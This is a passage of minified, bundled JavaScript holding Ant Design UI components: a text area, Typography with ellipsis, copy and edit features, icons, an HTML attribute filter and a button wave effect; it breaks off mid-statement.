K=L("input",b),Q=(0,c.default)(K),[Y,Z]=(0,g.useSharedStyle)(K,$);v(K,Q);let{compactSize:ee,compactItemClassnames:et}=(0,m.useCompactItemContext)(K,_),er=(0,u.default)(e=>S??ee??e),[en,eo]=(0,p.default)("textArea",I,y),ea=(0,o.default)(w??O),[ei,es]=t.useState(!1),[el,ec]=t.useState(!1);return t.createElement(r.default,{autoComplete:N,...D,style:{...J.root,...j,...P},styles:J,disabled:x??z,allowClear:ea,className:(0,n.clsx)(Z,Q,E,$,et,F,G.root,{[`${K}-textarea-affix-wrapper-resize-dirty`]:el}),classNames:{...G,textarea:(0,n.clsx)({[`${K}-sm`]:"small"===er,[`${K}-lg`]:"large"===er},Y,G.textarea,ei&&`${K}-mouse-active`),variant:(0,n.clsx)({[`${K}-${en}`]:eo},(0,i.getStatusClassNames)(K,q)),affixWrapper:(0,n.clsx)(`${K}-textarea-affix-wrapper`,{[`${K}-affix-wrapper-rtl`]:"rtl"===_,[`${K}-affix-wrapper-sm`]:"small"===er,[`${K}-affix-wrapper-lg`]:"large"===er,[`${K}-textarea-show-count`]:M||e.count?.show},Y)},prefixCls:K,suffix:W&&t.createElement("span",{className:`${K}-textarea-suffix`},U),showCount:M,ref:X,onResize:e=>{if(A?.(e),ei&&"function"==typeof getComputedStyle){let e=X.current?.nativeElement?.querySelector("textarea");e&&"both"===getComputedStyle(e).resize&&ec(!0)}},onMouseDown:e=>{es(!0),R?.(e);let t=()=>{es(!1),document.removeEventListener("mouseup",t)};document.addEventListener("mouseup",t)}})});e.s(["default",0,S],35432)},13987,29050,55125,6267,85417,13897,61812,21229,90144,e=>{"use strict";var t=e.i(71645),r=e.i(11223),n=e.i(30731),o=e.i(7670),a=e.i(63731),i=e.i(35432),s=e.i(83293),l=e.i(46422);e.i(65846);var c=e.i(96091);let u=(0,l.genStyleHooks)("Typography",e=>{let t,{componentCls:r,titleMarginTop:n}=e;return{[r]:{color:e.colorText,wordBreak:"break-word",lineHeight:e.lineHeight,[`&${r}-secondary, &${r}-link${r}-secondary`]:{color:e.colorTextDescription},[`&${r}-success, &${r}-link${r}-success`]:{color:e.colorSuccessText},[`&${r}-warning, &${r}-link${r}-warning`]:{color:e.colorWarningText},[`&${r}-danger, &${r}-link${r}-danger`]:{color:e.colorErrorText,[`&${r}-link:active, &${r}-link:focus`]:{color:e.colorErrorTextActive},[`&${r}-link:hover`]:{color:e.colorErrorTextHover}},[`&${r}-disabled`]:{color:e.colorTextDisabled,cursor:"not-allowed",userSelect:"none"},[`
        div&,
        p
      `]:{marginBottom:"1em"},...(t={},[1,2,3,4,5].forEach(r=>{t[`
      h${r}&,
      div&-h${r},
      div&-h${r} > textarea,
      h${r}
    `]=((e,t,r,n)=>{let{titleMarginBottom:o,fontWeightStrong:a}=n;return{marginBottom:o,color:r,fontWeight:a,fontSize:e,lineHeight:t}})(e[`fontSizeHeading${r}`],e[`lineHeightHeading${r}`],e.colorTextHeading,e)}),t),[`
      & + h1${r},
      & + h2${r},
      & + h3${r},
      & + h4${r},
      & + h5${r}
      `]:{marginTop:n},[`
      div,
      ul,
      li,
      p,
      h1,
      h2,
      h3,
      h4,
      h5`]:{[`
        + h1,
        + h2,
        + h3,
        + h4,
        + h5
        `]:{marginTop:n}},...{code:{margin:"0 0.2em",paddingInline:"0.4em",paddingBlock:"0.2em 0.1em",fontSize:"85%",fontFamily:e.fontFamilyCode,background:"rgba(150, 150, 150, 0.1)",border:"1px solid rgba(100, 100, 100, 0.2)",borderRadius:3},kbd:{margin:"0 0.2em",paddingInline:"0.4em",paddingBlock:"0.15em 0.1em",fontSize:"90%",fontFamily:e.fontFamilyCode,background:"rgba(150, 150, 150, 0.06)",border:"1px solid rgba(100, 100, 100, 0.2)",borderBottomWidth:2,borderRadius:3},mark:{padding:0,backgroundColor:c.gold[2]},"u, ins":{textDecoration:"underline",textDecorationSkipInk:"auto"},"s, del":{textDecoration:"line-through"},strong:{fontWeight:e.fontWeightStrong},"ul, ol":{marginInline:0,marginBlock:"0 1em",padding:0,li:{marginInline:"20px 0",marginBlock:0,paddingInline:"4px 0",paddingBlock:0}},ul:{listStyleType:"circle",ul:{listStyleType:"disc"}},ol:{listStyleType:"decimal"},"pre, blockquote":{margin:"1em 0"},pre:{padding:"0.4em 0.6em",whiteSpace:"pre-wrap",wordWrap:"break-word",background:"rgba(150, 150, 150, 0.1)",border:"1px solid rgba(100, 100, 100, 0.2)",borderRadius:3,fontFamily:e.fontFamilyCode,code:{display:"inline",margin:0,padding:0,fontSize:"inherit",fontFamily:"inherit",background:"transparent",border:0}},blockquote:{paddingInline:"0.6em 0",paddingBlock:0,borderInlineStart:"4px solid rgba(100, 100, 100, 0.2)",opacity:.85}},...(e=>{let{componentCls:t}=e,r=`${t}-link`;return{[`&${r}`]:{...(0,s.operationUnit)(e),userSelect:"text",[`&[disabled], &${t}-disabled`]:{color:e.colorTextDisabled,cursor:"not-allowed","&:active, &:hover":{color:e.colorTextDisabled},"&:active":{pointerEvents:"none"}}}}})(e),[`${r}-actions`]:{display:"inline"},[`
        ${r}-expand,
        ${r}-collapse,
        ${r}-edit,
        ${r}-copy
      `]:{...(0,s.operationUnit)(e),marginInlineStart:e.marginXXS},...(e=>{let{componentCls:t,paddingSM:r}=e;return{"&-edit-content":{position:"relative","div&":{insetInlineStart:e.calc(e.paddingSM).mul(-1).equal(),insetBlockStart:e.calc(r).div(-2).add(1).equal(),marginBottom:e.calc(r).div(2).sub(2).equal()},[`${t}-edit-content-confirm`]:{position:"absolute",insetInlineEnd:e.calc(e.marginXS).add(2).equal(),insetBlockEnd:e.marginXS,color:e.colorIcon,fontWeight:"normal",fontSize:e.fontSize,fontStyle:"normal",pointerEvents:"none"},textarea:{margin:"0!important",MozTransition:"none",height:"1em"}}}})(e),...{[`${e.componentCls}-copy-success`]:{[`
    &,
    &:hover,
    &:focus`]:{color:e.colorSuccess}},[`${e.componentCls}-copy-icon-only`]:{marginInlineStart:0}},...{[`
  a&-ellipsis,
  span&-ellipsis
  `]:{display:"inline-block",maxWidth:"100%"},"&-ellipsis-single-line":{whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis","a&, span&":{verticalAlign:"bottom"},"> code":{paddingBlock:0,maxWidth:"calc(100% - 1.2em)",display:"inline-block",overflow:"hidden",textOverflow:"ellipsis",verticalAlign:"bottom",boxSizing:"content-box"}},"&-ellipsis-multiple-line":{display:"-webkit-box",overflow:"hidden",WebkitLineClamp:3,WebkitBoxOrient:"vertical"}},"&-rtl":{direction:"rtl"}}}},()=>({titleMarginTop:"1.2em",titleMarginBottom:"0.5em"}));e.s(["default",0,e=>{let{prefixCls:s,"aria-label":l,className:c,style:d,direction:p,maxLength:m,autoSize:f=!0,value:g,onSave:h,onCancel:b,onEnd:y,component:v,enterIcon:S=t.createElement(r.default,null)}=e,x=t.useRef(null),C=t.useRef(!1),w=t.useRef(null),[k,$]=t.useState(g);t.useEffect(()=>{$(g)},[g]),t.useEffect(()=>{if(x.current?.resizableTextArea){let{textArea:e}=x.current.resizableTextArea;e.focus();let{length:t}=e.value;e.setSelectionRange(t,t)}},[]);let E=()=>{h(k.trim())},[P,T]=u(s),I=(0,o.clsx)(s,`${s}-edit-content`,{[`${s}-rtl`]:"rtl"===p,[`${s}-${v}`]:!!v},c,P,T);return t.createElement("div",{className:I,style:d},t.createElement(i.default,{ref:x,maxLength:m,value:k,onChange:({target:e})=>{$(e.value.replace(/[\n\r]/g,""))},onKeyDown:({keyCode:e})=>{C.current||(w.current=e)},onKeyUp:({keyCode:e,ctrlKey:t,altKey:r,metaKey:o,shiftKey:a})=>{w.current!==e||C.current||t||r||o||a||(e===n.default.ENTER?(E(),y?.()):e===n.default.ESC&&b())},onCompositionStart:()=>{C.current=!0},onCompositionEnd:()=>{C.current=!1},onBlur:()=>{E()},"aria-label":l,rows:1,autoSize:f}),null!==S?(0,a.cloneElement)(S,{className:`${s}-edit-content-confirm`}):null)}],13987),e.i(63335);var d=e.i(80251);e.i(47167);let p=async(e,t)=>{try{return t?await navigator.clipboard.write([new ClipboardItem({"text/html":new Blob([e],{type:"text/html"}),"text/plain":new Blob([e],{type:"text/plain"})})]):await navigator.clipboard.writeText(e),!0}catch{return!1}};async function m(e,t){if("string"!=typeof e)return!1;let r=t?.format==="text/html";return!!(await p(e,r)||((e,t)=>{let r=!1,n=n=>{n.stopPropagation(),n.preventDefault(),n.clipboardData?.clearData(),n.clipboardData?.setData("text/plain",e),t&&n.clipboardData?.setData("text/html",e),r=!0};try{return document.addEventListener("copy",n,{capture:!0}),document.execCommand("copy"),r}catch{return!1}finally{document.removeEventListener("copy",n,{capture:!0})}})(e,r))}var f=e.i(76398);let g=(e,t={})=>!(0,f.default)(e)&&t?.skipEmpty?[]:Array.isArray(e)?e:[e];function h(e,r){return t.useMemo(()=>{let t=!!e;return[t,{...r,...t&&"object"==typeof e?e:null}]},[e])}e.s(["default",0,g],29050),e.s(["default",0,({copyConfig:e,children:r})=>{let[n,o]=t.useState(!1),[a,i]=t.useState(!1),s=t.useRef(null),l=()=>{s.current&&clearTimeout(s.current)},c={};return e.format&&(c.format=e.format),t.useEffect(()=>l,[]),{copied:n,copyLoading:a,onClick:(0,d.useEvent)(async t=>{t?.preventDefault(),t?.stopPropagation(),i(!0);try{let n="function"==typeof e.text?await e.text():e.text;await m(n||g(r,{skipEmpty:!0}).join("")||"",c),i(!1),o(!0),l(),s.current=setTimeout(()=>{o(!1)},3e3),e.onCopy?.(t)}catch(e){throw i(!1),e}})}}],55125),e.s(["default",()=>h],6267),e.s(["default",0,e=>{let r=(0,t.useRef)(void 0);return(0,t.useEffect)(()=>{r.current=e}),r.current}],85417),e.s(["default",0,(e,r,n)=>(0,t.useMemo)(()=>!0===e?{title:r??n}:(0,t.isValidElement)(e)?{title:e}:"object"==typeof e?{title:r??n,...e}:{title:e},[e,r,n])],13897);var b=e.i(42064);let y=t.forwardRef((e,r)=>{let{prefixCls:n,component:a="article",className:i,rootClassName:s,children:l,direction:c,style:d,...p}=e,{getPrefixCls:m,direction:f,className:g,style:h}=(0,b.useComponentConfig)("typography"),y=m("typography",n),[v,S]=u(y),x=(0,o.clsx)(y,g,{[`${y}-rtl`]:"rtl"===(c??f)},i,s,v,S),C={...h,...d};return t.createElement(a,{className:x,style:C,ref:r,...p},l)});e.s(["default",0,y],61812);let v={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M912 190h-69.9c-9.8 0-19.1 4.5-25.1 12.2L404.7 724.5 207 474a32 32 0 00-25.1-12.2H112c-6.7 0-10.4 7.7-6.3 12.9l273.9 347c12.8 16.2 37.4 16.2 50.3 0l488.4-618.9c4.1-5.1.4-12.8-6.3-12.8z"}}]},name:"check",theme:"outlined"};var S=e.i(9583);function x(){return(x=Object.assign.bind()).apply(this,arguments)}let C=t.forwardRef((e,r)=>t.createElement(S.default,x({},e,{ref:r,icon:v})));e.s(["default",0,C],21229);let w={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"}}]},name:"copy",theme:"outlined"};function k(){return(k=Object.assign.bind()).apply(this,arguments)}let $=t.forwardRef((e,r)=>t.createElement(S.default,k({},e,{ref:r,icon:w})));e.s(["default",0,$],90144)},39295,e=>{"use strict";e.i(47167);var t=e.i(71645);let r={icon:{tag:"svg",attrs:{viewBox:"0 0 1024 1024",focusable:"false"},children:[{tag:"path",attrs:{d:"M988 548c-19.9 0-36-16.1-36-36 0-59.4-11.6-117-34.6-171.3a440.45 440.45 0 00-94.3-139.9 437.71 437.71 0 00-139.9-94.3C629 83.6 571.4 72 512 72c-19.9 0-36-16.1-36-36s16.1-36 36-36c69.1 0 136.2 13.5 199.3 40.3C772.3 66 827 103 874 150c47 47 83.9 101.8 109.7 162.7 26.7 63.1 40.2 130.2 40.2 199.3.1 19.9-16 36-35.9 36z"}}]},name:"loading",theme:"outlined"};var n=e.i(9583);function o(){return(o=Object.assign.bind()).apply(this,arguments)}let a=t.forwardRef((e,a)=>t.createElement(n.default,o({},e,{ref:a,icon:r})));e.s(["default",0,a],39295)},98586,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(8211),n=e.i(1361),o=e.i(78052);e.i(63335);var a=e.i(51095),i=e.i(43081),s=e.i(30294),l=e.i(1676),c=e.i(32839),u=e.i(7670),d=e.i(76398),p=e.i(14515),m=e.i(42064),f=e.i(29447),g=e.i(91816),h=e.i(13987),b=e.i(55125),y=e.i(6267),v=e.i(85417),S=e.i(13897),x=e.i(61812),C=e.i(21229),w=e.i(90144),k=e.i(39295),$=e.i(29050);let E=e=>!1===e?[!1,!1]:(0,$.default)(e);function P(e,t,r){return!0===e||void 0===e?t:e||r&&t}let T=e=>["string","number"].includes(typeof e),I=e=>{let{prefixCls:r,copied:n,locale:o,iconOnly:a,tooltips:i,icon:s,tabIndex:l,onCopy:c,loading:d}=e,p=E(i),m=E(s),{copied:f,copy:h}=o??{},b=n?f:h,y=P(p[+!!n],b),v="string"==typeof y?y:b;return t.createElement(g.default,{title:y},t.createElement("button",{type:"button",className:(0,u.clsx)(`${r}-copy`,{[`${r}-copy-success`]:n,[`${r}-copy-icon-only`]:a}),onClick:c,"aria-label":v,tabIndex:l},n?P(m[1],t.createElement(C.default,null),!0):P(m[0],d?t.createElement(k.default,null):t.createElement(w.default,null),!0)))},M=t.forwardRef(({style:e,children:r},n)=>{let o=t.useRef(null);return t.useImperativeHandle(n,()=>({isExceed:()=>{let e=o.current;return e.scrollHeight>e.clientHeight},getHeight:()=>o.current.clientHeight})),t.createElement("span",{"aria-hidden":!0,ref:o,style:{position:"fixed",display:"block",left:0,top:0,pointerEvents:"none",backgroundColor:"rgba(255, 0, 0, 0.65)",...e}},r)});function R(e,t){let r=0,n=[];for(let o=0;o<e.length;o+=1){if(r===t)return n;let a=e[o],i=r+(T(a)?String(a).length:1);if(i>t){let e=t-r;return n.push(String(a).slice(0,e)),n}n.push(a),r=i}return e}let A={display:"-webkit-box",overflow:"hidden",WebkitBoxOrient:"vertical"};function D(e){let{enableMeasure:n,width:o,text:a,children:s,rows:c,expanded:u,miscDeps:d,onEllipsis:p}=e,m=t.useMemo(()=>(0,i.toArray)(a),[a]),f=t.useMemo(()=>m.reduce((e,t)=>e+(T(t)?String(t).length:1),0),[a]),g=t.useMemo(()=>s(m,!1),[a]),[h,b]=t.useState(null),y=t.useRef(null),v=t.useRef(null),S=t.useRef(null),x=t.useRef(null),C=t.useRef(null),[w,k]=t.useState(!1),[$,E]=t.useState(0),[P,I]=t.useState(0),[D,L]=t.useState(null);(0,l.default)(()=>{n&&o&&f?E(1):E(0)},[o,a,c,n,m]),(0,l.default)(()=>{if(1===$)E(2),L(v.current&&getComputedStyle(v.current).whiteSpace);else if(2===$){let e=!!S.current?.isExceed();E(e?3:4),b(e?[0,f]:null),k(e),I(Math.max(S.current?.getHeight()||0,(1===c?0:x.current?.getHeight()||0)+(C.current?.getHeight()||0))+1),p(e)}},[$]);let _=h?Math.ceil((h[0]+h[1])/2):0;(0,l.default)(()=>{let[e,t]=h||[0,0];if(e!==t){let r=(y.current?.getHeight()||0)>P,n=_;t-e==1&&(n=r?e:t),b(r?[e,n]:[n,t])}},[h,_]);let O=t.useMemo(()=>{if(!n)return s(m,!1);if(3!==$||!h||h[0]!==h[1]){let e=s(m,!1);return[4,0].includes($)?e:t.createElement("span",{style:{...A,WebkitLineClamp:c}},e)}return s(u?m:R(m,h[0]),w)},[u,$,h,m].concat((0,r.default)(d))),N={width:o,margin:0,padding:0,whiteSpace:"nowrap"===D?"normal":"inherit"};return t.createElement(t.Fragment,null,O,2===$&&t.createElement(t.Fragment,null,t.createElement(M,{style:{...N,...A,WebkitLineClamp:c},ref:S},g),t.createElement(M,{style:{...N,...A,WebkitLineClamp:c-1},ref:x},g),t.createElement(M,{style:{...N,...A,WebkitLineClamp:1},ref:C},s([],!0))),3===$&&h&&h[0]!==h[1]&&t.createElement(M,{style:{...N,top:400},ref:y},s(R(m,_),!0)),1===$&&t.createElement("span",{style:{whiteSpace:"inherit"},ref:v}))}let L=({enableEllipsis:e,isEllipsis:r,open:n,children:o,tooltipProps:a})=>a?.title&&e?t.createElement(g.default,{open:n&&r,...a},o):o,_=["delete","mark","code","underline","strong","keyboard","italic"],O=t.forwardRef((e,C)=>{let{prefixCls:w,className:k,style:$,type:E,disabled:P,children:M,ellipsis:R,editable:A,copyable:O,component:N,title:F,onMouseEnter:j,onMouseLeave:H,...B}=e,{getPrefixCls:z,direction:V}=t.useContext(m.ConfigContext),[W]=(0,f.default)("Text"),U=t.useRef(null),q=t.useRef(null),G=z("typography",w),J=(0,a.omit)(B,_),[X,K]=(0,y.default)(A),[Q,Y]=(0,s.useControlledState)(!1,K.editing),{triggerType:Z=["icon"]}=K,ee=e=>{e&&K.onStart?.(),Y(e)},et=(0,v.default)(Q);(0,l.default)(()=>{!Q&&et&&q.current?.focus()},[Q]);let er=e=>{e?.preventDefault(),ee(!0)},[en,eo]=(0,y.default)(O),{copied:ea,copyLoading:ei,onClick:es}=(0,b.default)({copyConfig:eo,children:M}),[el,ec]=t.useState(!1),[eu,ed]=t.useState(!1),[ep,em]=t.useState(!1),[ef,eg]=t.useState(!1),[eh,eb]=t.useState(!0),[ey,ev]=(0,y.default)(R,{expandable:!1,symbol:e=>e?W?.collapse:W?.expand}),[eS,ex]=(0,s.useControlledState)(ev.defaultExpanded||!1,ev.expanded),eC=ey&&(!eS||"collapsible"===ev.expandable),{rows:ew=1}=ev,ek=t.useMemo(()=>eC&&(void 0!==ev.suffix||ev.onEllipsis||ev.expandable||X||en),[eC,ev,X,en]);(0,l.default)(()=>{ey&&!ek&&(ec((0,p.isStyleSupport)("webkitLineClamp")),ed((0,p.isStyleSupport)("textOverflow")))},[ek,ey]);let[e$,eE]=t.useState(eC),eP=t.useMemo(()=>!ek&&(1===ew?eu:el),[ek,eu,el]);(0,l.default)(()=>{eE(eP&&eC)},[eP,eC]);let eT=eC&&(e$?ef:ep),eI=eC&&1===ew&&e$,eM=eC&&ew>1&&e$,[eR,eA]=t.useState(0),[eD,eL]=t.useState(!1),[e_,eO]=t.useState(!1),eN=e=>{em(e),ep!==e&&ev.onEllipsis?.(e)};t.useEffect(()=>{let e=U.current;if(ey&&e$&&e){let t,r,n,o=(t=document.createElement("em"),e.appendChild(t),r=e.getBoundingClientRect(),n=t.getBoundingClientRect(),e.removeChild(t),r.left>n.left||n.right>r.right||r.top>n.top||n.bottom>r.bottom);ef!==o&&eg(o)}},[ey,e$,M,eM,eh,eR]),t.useEffect(()=>{let e=U.current;if("u"<typeof IntersectionObserver||!e||!e$||!eC)return;let t=new IntersectionObserver(()=>{eb(!!e.offsetParent)});return t.observe(e),()=>{t.disconnect()}},[e$,eC]);let eF=(0,S.default)(ev.tooltip,K.text,M),ej=t.useMemo(()=>{if(ey&&!e$)return[K.text,M,F,eF.title].find(T)},[ey,e$,F,eF.title,eT]);return Q?t.createElement(h.default,{value:K.text??("string"==typeof M?M:""),onSave:e=>{K.onChange?.(e),ee(!1)},onCancel:()=>{K.onCancel?.(),ee(!1)},onEnd:K.onEnd,prefixCls:G,className:k,style:$,direction:V,component:N,maxLength:K.maxLength,autoSize:K.autoSize,enterIcon:K.enterIcon}):t.createElement(o.default,{onResize:({offsetWidth:e})=>{eA(e)},disabled:!eC},o=>t.createElement(L,{tooltipProps:eF,enableEllipsis:eC,isEllipsis:eT,open:e_&&!eD},t.createElement(x.default,{onMouseEnter:e=>{eO(!0),j?.(e)},onMouseLeave:e=>{eO(!1),H?.(e)},className:(0,u.clsx)({[`${G}-${E}`]:E,[`${G}-disabled`]:P,[`${G}-ellipsis`]:ey,[`${G}-ellipsis-single-line`]:eI,[`${G}-ellipsis-multiple-line`]:eM,[`${G}-link`]:"a"===N},k),prefixCls:w,style:{...$,WebkitLineClamp:eM?ew:void 0},component:N,ref:(0,c.composeRef)(o,U,C),direction:V,onClick:Z.includes("text")?er:void 0,"aria-label":ej?.toString(),title:F,...J},t.createElement(D,{enableMeasure:eC&&!e$,text:M,rows:ew,width:eR,onEllipsis:eN,expanded:eS,miscDeps:[ea,eS,ei,X,en,W].concat((0,r.default)(_.map(t=>e[t])))},(r,o)=>{var a;let s,l,c;return function({mark:e,code:r,underline:n,delete:o,strong:a,keyboard:i,italic:s},l){let c=l;function u(e,r){r&&(c=t.createElement(e,{},c))}return u("strong",a),u("u",n),u("del",o),u("code",r),u("mark",e),u("kbd",i),u("i",s),c}(e,t.createElement(t.Fragment,null,r.length>0&&o&&!eS&&ej?t.createElement("span",{key:"show-content","aria-hidden":!0},r):r,[(a=o)&&!eS&&t.createElement("span",{"aria-hidden":!0,key:"ellipsis"},"..."),ev.suffix,(s=a&&(()=>{let{expandable:e,symbol:r}=ev;return e?t.createElement("button",{type:"button",key:"expand",className:`${G}-${eS?"collapse":"expand"}`,onClick:e=>{var t;ex((t={expanded:!eS}).expanded),ev.onExpand?.(e,t)},"aria-label":eS?W.collapse:W?.expand},"function"==typeof r?r(eS):r):null})(),l=(()=>{if(!X)return;let{icon:e,tooltip:r,tabIndex:o}=K,a=(0,i.toArray)(r)[0]||W?.edit,s="string"==typeof a?a:"";return Z.includes("icon")?t.createElement(g.default,{key:"edit",title:!1===r?"":a},t.createElement("button",{type:"button",ref:q,className:`${G}-edit`,onClick:er,"aria-label":s,tabIndex:o},e||t.createElement(n.default,{role:"button"}))):null})(),c=en?t.createElement(I,{key:"copy",...eo,prefixCls:G,copied:ea,locale:W,onCopy:es,loading:ei,iconOnly:!(0,d.default)(M)}):null,s||l||c?t.createElement("span",{key:"operations",className:`${G}-actions`,onMouseEnter:()=>eL(!0),onMouseLeave:()=>eL(!1)},s,l,c):null)]))}))))}),N=t.forwardRef((e,r)=>{let{ellipsis:n,rel:o,children:a,navigate:i,...s}=e,l={...s,rel:void 0===o&&"_blank"===s.target?"noopener noreferrer":o};return t.createElement(O,{...l,ref:r,ellipsis:!!n,component:"a"},a)}),F=t.forwardRef((e,r)=>{let{children:n,...o}=e;return t.createElement(O,{ref:r,...o,component:"div"},n)}),j=t.forwardRef((e,r)=>{let{ellipsis:n,children:o,...i}=e,s=t.useMemo(()=>n&&"object"==typeof n?(0,a.omit)(n,["expandable","rows"]):n,[n]);return t.createElement(O,{ref:r,...i,ellipsis:s,component:"span"},o)}),H=[1,2,3,4,5],B=t.forwardRef((e,r)=>{let{level:n=1,children:o,...a}=e,i=H.includes(n)?`h${n}`:"h1";return t.createElement(O,{ref:r,...a,component:i},o)}),z=x.default;z.Text=j,z.Link=N,z.Title=B,z.Paragraph=F,e.s(["Typography",0,z],98586)},50824,e=>{"use strict";let t=`accept acceptCharset accessKey action allowFullScreen allowTransparency
    alt async autoComplete autoFocus autoPlay capture cellPadding cellSpacing challenge
    charSet checked classID className colSpan cols content contentEditable contextMenu
    controls coords crossOrigin data dateTime default defer dir disabled download draggable
    encType form formAction formEncType formMethod formNoValidate formTarget frameBorder
    headers height hidden high href hrefLang htmlFor httpEquiv icon id inputMode integrity
    is keyParams keyType kind label lang list loop low manifest marginHeight marginWidth max maxLength media
    mediaGroup method min minLength multiple muted name noValidate nonce open
    optimum pattern placeholder poster preload radioGroup readOnly rel required
    reversed role rowSpan rows sandbox scope scoped scrolling seamless selected
    shape size sizes span spellCheck src srcDoc srcLang srcSet start step style
    summary tabIndex target title type useMap value width wmode wrap`,r=`onCopy onCut onPaste onCompositionEnd onCompositionStart onCompositionUpdate onKeyDown
    onKeyPress onKeyUp onFocus onBlur onChange onInput onSubmit onClick onContextMenu onDoubleClick
    onDrag onDragEnd onDragEnter onDragExit onDragLeave onDragOver onDragStart onDrop onMouseDown
    onMouseEnter onMouseLeave onMouseMove onMouseOut onMouseOver onMouseUp onSelect onTouchCancel
    onTouchEnd onTouchMove onTouchStart onScroll onWheel onAbort onCanPlay onCanPlayThrough
    onDurationChange onEmptied onEncrypted onEnded onError onLoadedData onLoadedMetadata
    onLoadStart onPause onPlay onPlaying onProgress onRateChange onSeeked onSeeking onStalled onSuspend onTimeUpdate onVolumeChange onWaiting onLoad onError`,n=`${t} ${r}`.split(/[\s\n]+/);function o(e,t){return 0===e.indexOf(t)}function a(e,t=!1){let r;r=!1===t?{aria:!0,data:!0,attr:!0}:!0===t?{aria:!0}:{...t};let i={};return Object.keys(e).forEach(t=>{(r.aria&&("role"===t||o(t,"aria-"))||r.data&&o(t,"data-")||r.attr&&n.includes(t))&&(i[t]=e[t])}),i}e.s(["default",()=>a])},8850,e=>{"use strict";var t=e.i(29447);e.s(["useLocale",()=>t.default])},87719,e=>{"use strict";e.s(["default",0,function(...e){let t={};return e.forEach(e=>{e&&Object.keys(e).forEach(r=>{void 0!==e[r]&&(t[r]=e[r])})}),t}])},63113,e=>{"use strict";var t=e.i(71645),r=e.i(64517),n=e.i(50824),o=e.i(8850),a=e.i(87414),i=e.i(87719),s=e.i(76398);let l={},c=(e,t)=>{if(!e&&(!1===e||!1===t||null===t))return!1;if(void 0===e&&void 0===t)return null;let r={closeIcon:"boolean"!=typeof t&&null!==t?t:void 0};return e&&"object"==typeof e&&(r={...r,...e}),r};e.s(["pickClosable",0,e=>{if(!e)return;let{closable:t,closeIcon:r}=e;return{closable:t,closeIcon:r}},"useClosable",0,(e,u,d=l)=>{let[p]=(0,o.useLocale)("global",a.default.global);return t.default.useMemo(()=>((e,o,a=l,u="Close")=>{let d=c(e?.closable,e?.closeIcon),p=c(o?.closable,o?.closeIcon),m={closeIcon:t.default.createElement(r.default,null),...a},f=!1!==d&&(d?(0,i.default)(m,p,d):!1!==p&&(p?(0,i.default)(m,p):!!m.closable&&m)),g="boolean"!=typeof f&&!!f?.disabled;if(!1===f)return[!1,null,g,{}];let[h,b]=((e,r,o)=>{let{closeIconRender:a}=r,{closeIcon:i,...l}=e,c=i,u=(0,n.default)(l,!0);return(0,s.default)(c)&&(a&&(c=a(c)),c=t.default.isValidElement(c)?t.default.cloneElement(c,{"aria-label":o,...c.props,...u}):t.default.createElement("span",{"aria-label":o,...u},c)),[c,u]})(f,m,u);return[!0,h,g,b]})(e,u,{closeIcon:t.default.createElement(r.default,null),...d},p.close),[e,u,d,p.close])}])},21872,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(43022),n=e.i(32839),o=e.i(7670),a=e.i(42064),i=e.i(63731),s=e.i(46422);let l=(0,s.genComponentStyleHook)("Wave",e=>{let{componentCls:t,colorPrimary:r,motionDurationSlow:n,motionEaseInOut:o,motionEaseOutCirc:a,antCls:i}=e,[,l]=(0,s.genCssVar)(i,"wave");return{[t]:{position:"absolute",background:"transparent",pointerEvents:"none",boxSizing:"border-box",color:l("color",r),boxShadow:"0 0 0 0 currentcolor",opacity:.2,"&.wave-motion-appear":{transition:["box-shadow 0.4s","opacity 2s"].map(e=>`${e} ${a}`).join(","),"&-active":{boxShadow:"0 0 0 6px currentcolor",opacity:0},"&.wave-quick":{transition:["box-shadow","opacity"].map(e=>`${e} ${n} ${o}`).join(",")}}}}});e.i(63335);var c=e.i(80251),u=e.i(37434),d=e.i(19581);let p=`${a.defaultPrefixCls}-wave-target`;var m=e.i(28473),f=e.i(88014);let g="__rc_react_root__";async function h(e){return Promise.resolve().then(()=>{e[g]?.unmount(),delete e[g]})}function b(e){return e&&"string"==typeof e&&"#fff"!==e&&"#ffffff"!==e&&"rgb(255, 255, 255)"!==e&&"rgba(255, 255, 255, 1)"!==e&&!/rgba\((?:\d*, ){3}0\)/.test(e)&&"transparent"!==e&&"canvastext"!==e}function y(e){return Number.isNaN(e)?0:e}let v=e=>{let{className:r,target:i,component:l,colorSource:c}=e,d=t.useRef(null),{getPrefixCls:f}=t.useContext(a.ConfigContext),g=f(),[v]=(0,s.genCssVar)(g,"wave"),[S,x]=t.useState(null),[C,w]=t.useState([]),[k,$]=t.useState(0),[E,P]=t.useState(0),[T,I]=t.useState(0),[M,R]=t.useState(0),[A,D]=t.useState(!1),L={left:k,top:E,width:T,height:M,borderRadius:C.map(e=>`${e}px`).join(" ")};function _(){let e=getComputedStyle(i);x(function(e,t=null){let r=getComputedStyle(e),{borderTopColor:n,borderColor:o,backgroundColor:a}=r;return t&&b(r[t])?r[t]:[n,o,a].find(b)??null}(i,c));let t="static"===e.position,{borderLeftWidth:r,borderTopWidth:n}=e;$(t?i.offsetLeft:y(-Number.parseFloat(r))),P(t?i.offsetTop:y(-Number.parseFloat(n))),I(i.offsetWidth),R(i.offsetHeight);let{borderTopLeftRadius:o,borderTopRightRadius:a,borderBottomLeftRadius:s,borderBottomRightRadius:l}=e;w([o,a,l,s].map(e=>y(Number.parseFloat(e))))}if(S&&(L[v("color")]=S),t.useEffect(()=>{if(i){let e,t=(0,u.default)(()=>{_(),D(!0)});return"u">typeof ResizeObserver&&(e=new ResizeObserver(_)).observe(i),()=>{u.default.cancel(t),e?.disconnect()}}},[i]),!A)return null;let O=("Checkbox"===l||"Radio"===l)&&i?.classList.contains(p);return 